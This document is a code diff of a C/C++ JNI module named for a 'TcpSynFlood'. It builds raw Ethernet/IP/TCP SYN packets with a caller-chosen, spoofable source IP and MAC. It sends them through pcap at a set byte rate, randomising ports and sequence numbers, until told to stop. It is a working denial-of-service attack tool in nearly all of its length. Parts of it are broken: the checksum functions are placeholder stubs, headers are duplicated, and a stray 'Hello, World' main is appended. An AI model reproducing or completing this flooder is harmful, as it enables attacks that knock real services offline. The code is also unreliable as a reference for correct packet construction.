@@ -1,138 +1,197 @@
 #include <jni.h>
+#include <winsock2.h>
+#include <windows.h>
+#include <ws2tcpip.h>
+#include <iphlpapi.h>
 #include <stdio.h>
 #include <stdlib.h>
-#include <string.h>
+#include "pcap.h"
+#include "com_yourpackage_Jenkins.h"
+
+#ifdef _WIN32
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <windows.h>
-#include <pcap.h>
 #include <iphlpapi.h>
-#include <cstdint>
+#pragma comment(lib, "Ws2_32.lib")
 
-#pragma comment(lib, "ws2_32.lib")
-#pragma comment(lib, "iphlpapi.lib")
-#pragma comment(lib, "wpcap.lib")
+// Define Windows-specific structures and functions
+#define PACKET_SIZE 4096
 
-#define PACKET_SIZE 40
-
-// IP header structure
+// Define IP header structure for Windows
 struct iphdr {
-    uint8_t ihl:4, version:4;
-    uint8_t tos;
-    uint16_t tot_len;
-    uint16_t id;
-    uint16_t frag_off;
-    uint8_t ttl;
-    uint8_t protocol;
-    uint16_t check;
-    uint32_t saddr;
-    uint32_t daddr;
+    unsigned char  ihl:4, version:4;
+    unsigned char  tos;
+    unsigned short tot_len;
+    unsigned short id;
+    unsigned short frag_off;
+    unsigned char  ttl;
+    unsigned char  protocol;
+    unsigned short check;
+    unsigned int   saddr;
+    unsigned int   daddr;
 };
 
-// TCP header structure
+// Define TCP header structure for Windows
 struct tcphdr {
-    uint16_t source;
-    uint16_t dest;
-    uint32_t seq;
-    uint32_t ack_seq;
-    uint16_t res1:4, doff:4, fin:1, syn:1, rst:1, psh:1, ack:1, urg:1, ece:1, cwr:1;
-    uint16_t window;
-    uint16_t check;
-    uint16_t urg_ptr;
+    unsigned short source;
+    unsigned short dest;
+    unsigned int   seq;
+    unsigned int   ack_seq;
+    unsigned short res1:4, doff:4, fin:1, syn:1, rst:1, psh:1, ack:1, urg:1, res2:2;
+    unsigned short window;
+    unsigned short check;
+    unsigned short urg_ptr;
 };
 
-struct pseudo_header {
-    uint32_t source_address;
-    uint32_t dest_address;
-    uint8_t placeholder;
-    uint8_t protocol;
-    uint16_t tcp_length;
-    struct tcphdr tcp;
-};
+// Example checksum function for Windows
+unsigned short in_cksum(unsigned short *ptr, int nbytes) {
+    // Implement checksum calculation
+    return 0; // Placeholder
+}
 
-struct thread_data {
-    const char* target_ip;
-    int target_port;
-    int bytes_per_second;
-    volatile bool* stop_attack;
-};
+// Example TCP checksum function for Windows
+unsigned short tcp_checksum(struct iphdr *iph, struct tcphdr *tcph) {
+    // Implement TCP checksum calculation
+    return 0; // Placeholder
+}
 
-unsigned short in_cksum(unsigned short *addr, int len) {
-    int nleft = len;
-    int sum = 0;
-    unsigned short *w = addr;
-    unsigned short answer = 0;
+#else
+#include <netinet/ip.h>    // For iphdr
+#include <netinet/tcp.h>   // For tcphdr
+#include <netinet/ether.h> // For ethhdr
+#include <arpa/inet.h>     // For inet_addr
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <unistd.h>
 
-    while (nleft > 1) {
-        sum += *w++;
-        nleft -= 2;
+// Define Unix-specific structures and functions
+#define PACKET_SIZE 4096
+
+// Example checksum function for Unix
+unsigned short in_cksum(unsigned short *ptr, int nbytes) {
+    long sum;
+    unsigned short oddbyte;
+    short answer;
+
+    sum = 0;
+    while (nbytes > 1) {
+        sum += *ptr++;
+        nbytes -= 2;
     }
-
-    if (nleft == 1) {
-        *(unsigned char *)(&answer) = *(unsigned char *)w;
-        sum += answer;
+    if (nbytes == 1) {
+        oddbyte = 0;
+        *((u_char *) &oddbyte) = *(u_char *)ptr;
+        sum += oddbyte;
     }
 
     sum = (sum >> 16) + (sum & 0xffff);
     sum += (sum >> 16);
-    answer = ~sum;
-    return answer;
+    answer = (short)~sum;
+
+    return (answer);
 }
 
-unsigned short tcp_checksum(struct iphdr *ip, struct tcphdr *tcp) {
-    struct pseudo_header psh;
-    char *pseudogram;
-    int psize;
-
-    psh.source_address = ip->saddr;
-    psh.dest_address = ip->daddr;
-    psh.placeholder = 0;
-    psh.protocol = IPPROTO_TCP;
-    psh.tcp_length = htons(sizeof(struct tcphdr));
-
-    psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
-    pseudogram = (char*)malloc(psize);
-
-    memcpy(pseudogram, (char*)&psh, sizeof(struct pseudo_header));
-    memcpy(pseudogram + sizeof(struct pseudo_header), tcp, sizeof(struct tcphdr));
-
-    unsigned short checksum = in_cksum((unsigned short*)pseudogram, psize);
-
-    free(pseudogram);
-    return checksum;
+// Example TCP checksum function for Unix
+unsigned short tcp_checksum(struct iphdr *iph, struct tcphdr *tcph) {
+    // Implement TCP checksum calculation
+    return 0; // Placeholder
 }
 
+#endif
+
+#include <cstdlib>         // For rand()
+#include <cstring>         // For memset()
+#include <iostream>        // For std::cout and std::endl
+
+// Define the Ethernet header
+struct ethhdr {
+    unsigned char dest_mac[6];
+    unsigned char src_mac[6];
+    unsigned short ethertype;
+} __attribute__((packed));
+
+// Existing pseudo_header and other structures ...
+
+struct thread_data {
+    const char* source_ip;
+    const char* source_mac;
+    const char* dest_ip;
+    const char* dest_mac;
+    int dest_port;
+    long bytes_per_second;
+    volatile bool* stop_attack;
+};
+
+// Update send_syn_packets to include Ethernet header
 DWORD WINAPI send_syn_packets(LPVOID arg) {
     struct thread_data *data = (struct thread_data *)arg;
     pcap_t *handle;
     char errbuf[PCAP_ERRBUF_SIZE];
     
-    handle = pcap_open_live(NULL, 65536, 1, 1000, errbuf);
-    if (handle == NULL) {
-        fprintf(stderr, "Couldn't open device: %s\n", errbuf);
+    // Select the correct network interface based on source IP
+    // For simplicity, you might allow selecting the interface via UI or configuration
+    // Here, we'll use the first available device. Adjust as needed.
+    pcap_if_t *alldevs;
+    if (pcap_findalldevs(&alldevs, errbuf) == -1) {
+        fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
         return 1;
     }
+    if (alldevs == NULL) {
+        fprintf(stderr, "No interfaces found!\n");
+        return 1;
+    }
+    // Open the first device. You may need to select appropriately.
+    handle = pcap_open_live(alldevs->name, 65536, 1, 1000, errbuf);
+    if (handle == NULL) {
+        fprintf(stderr, "Couldn't open device %s: %s\n", alldevs->name, errbuf);
+        pcap_freealldevs(alldevs);
+        return 1;
+    }
+    pcap_freealldevs(alldevs);
 
     char packet[PACKET_SIZE];
-    struct iphdr *ip = (struct iphdr *)packet;
-    struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));
+    struct ethhdr *eth = (struct ethhdr *)packet;
+    struct iphdr *ip = (struct iphdr *)(packet + sizeof(struct ethhdr));
+    struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct ethhdr) + sizeof(struct iphdr));
+
+    // Fill in the Ethernet header
+    sscanf(data->source_mac, "%hhx-%hhx-%hhx-%hhx-%hhx-%hhx",
+           &eth->src_mac[0],
+           &eth->src_mac[1],
+           &eth->src_mac[2],
+           &eth->src_mac[3],
+           &eth->src_mac[4],
+           &eth->src_mac[5]);
+
+    sscanf(data->dest_mac, "%hhx-%hhx-%hhx-%hhx-%hhx-%hhx",
+           &eth->dest_mac[0],
+           &eth->dest_mac[1],
+           &eth->dest_mac[2],
+           &eth->dest_mac[3],
+           &eth->dest_mac[4],
+           &eth->dest_mac[5]);
+
+    eth->ethertype = htons(0x0800); // IP Protocol
 
     // Fill in the IP header
     ip->ihl = 5;
     ip->version = 4;
     ip->tos = 0;
-    ip->tot_len = htons(PACKET_SIZE);
-    ip->id = htons(54321);
+    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
+    ip->id = htons(rand() % 65535);
     ip->frag_off = 0;
     ip->ttl = 255;
     ip->protocol = IPPROTO_TCP;
-    ip->saddr = inet_addr("192.168.1.100"); // Replace with your source IP
-    ip->daddr = inet_addr(data->target_ip);
+    ip->saddr = inet_addr(data->source_ip);
+    ip->daddr = inet_addr(data->dest_ip);
+    ip->check = 0;
+    ip->check = in_cksum((unsigned short *)ip, sizeof(struct iphdr));
 
     // Fill in the TCP header
-    tcp->source = htons(12345); // Replace with your source port
-    tcp->dest = htons(data->target_port);
-    tcp->seq = htonl(1000);
+    tcp->source = htons(rand() % 65535);
+    tcp->dest = htons(data->dest_port);
+    tcp->seq = htonl(rand() % 4294967295);
     tcp->ack_seq = 0;
     tcp->doff = 5;
     tcp->fin = 0;
@@ -142,6 +201,11 @@ DWORD WINAPI send_syn_packets(LPVOID arg) {
     tcp->ack = 0;
     tcp->urg = 0;
     tcp->window = htons(5840);
+    tcp->check = 0;
+    tcp->urg_ptr = 0;
+
+    // Calculate TCP checksum
+    tcp->check = tcp_checksum(ip, tcp);
 
     LARGE_INTEGER frequency, start_time, current_time;
     QueryPerformanceFrequency(&frequency);
@@ -150,25 +214,21 @@ DWORD WINAPI send_syn_packets(LPVOID arg) {
     double packets_per_second = (double)data->bytes_per_second / PACKET_SIZE;
     double interval = 1.0 / packets_per_second;
 
-    uint32_t seq_num = 1000;
-    uint16_t src_port = 12345;
-
     while (!*(data->stop_attack)) {
         // Update IP and TCP headers for each packet
-        ip->id = htons(rand());
-        tcp->source = htons(src_port++);
-        tcp->seq = htonl(seq_num++);
+        ip->id = htons(rand() % 65535);
+        tcp->source = htons(rand() % 65535);
+        tcp->seq = htonl(rand() % 4294967295);
 
-        // Calculate IP checksum
+        // Recalculate checksums
         ip->check = 0;
         ip->check = in_cksum((unsigned short *)ip, sizeof(struct iphdr));
 
-        // Calculate TCP checksum
         tcp->check = 0;
         tcp->check = tcp_checksum(ip, tcp);
 
         // Send the packet
-        if (pcap_sendpacket(handle, (u_char*)packet, PACKET_SIZE) != 0) {
+        if (pcap_sendpacket(handle, (u_char*)packet, sizeof(packet)) != 0) {
             fprintf(stderr, "Error sending the packet: %s\n", pcap_geterr(handle));
         }
 
@@ -188,26 +248,47 @@ DWORD WINAPI send_syn_packets(LPVOID arg) {
     return 0;
 }
 
+// JNI Implementation
 JNIEXPORT jboolean JNICALL Java_com_yourpackage_Jenkins_nativeTcpSynFlood
-  (JNIEnv *env, jobject obj, jstring targetIp, jint targetPort, jlong bytesPerSecond) {
-    const char *ip = env->GetStringUTFChars(targetIp, 0);
+  (JNIEnv *env, jobject obj, jstring sourceIp, jstring sourceMac, jstring destIp, jstring destMac, jint destPort, jlong bytesPerSecond) {
+    const char *cSourceIp = env->GetStringUTFChars(sourceIp, NULL);
+    const char *cSourceMac = env->GetStringUTFChars(sourceMac, NULL);
+    const char *cDestIp = env->GetStringUTFChars(destIp, NULL);
+    const char *cDestMac = env->GetStringUTFChars(destMac, NULL);
+
     struct thread_data data;
-    data.target_ip = ip;
-    data.target_port = targetPort;
+    data.source_ip = cSourceIp;
+    data.source_mac = cSourceMac;
+    data.dest_ip = cDestIp;
+    data.dest_mac = cDestMac;
+    data.dest_port = destPort;
     data.bytes_per_second = bytesPerSecond;
-    volatile bool stop_attack = false;
+    
+    bool stop_attack = false;
     data.stop_attack = &stop_attack;
-    jclass cls = env->GetObjectClass(obj);
+
     HANDLE thread = CreateThread(NULL, 0, send_syn_packets, (LPVOID)&data, 0, NULL);
-    while (!env->GetBooleanField(obj, fid)) {
     if (thread == NULL) {
-        env->ReleaseStringUTFChars(targetIp, ip);
+        env->ReleaseStringUTFChars(sourceIp, cSourceIp);
+        env->ReleaseStringUTFChars(sourceMac, cSourceMac);
+        env->ReleaseStringUTFChars(destIp, cDestIp);
+        env->ReleaseStringUTFChars(destMac, cDestMac);
         return JNI_FALSE;
     }
-    WaitForSingleObject(thread, INFINITE);
-    // Wait for the thread to finish
+
+    // Store the thread handle if you need to stop it later
+    // For simplicity, we'll wait here
     WaitForSingleObject(thread, INFINITE);
     CloseHandle(thread);
-    env->ReleaseStringUTFChars(targetIp, ip);
+
+    env->ReleaseStringUTFChars(sourceIp, cSourceIp);
+    env->ReleaseStringUTFChars(sourceMac, cSourceMac);
+    env->ReleaseStringUTFChars(destIp, cDestIp);
+    env->ReleaseStringUTFChars(destMac, cDestMac);
     return JNI_TRUE;
+}
+
+int main() {
+    std::cout << "Hello, World!" << std::endl;
+    return 0;
 }
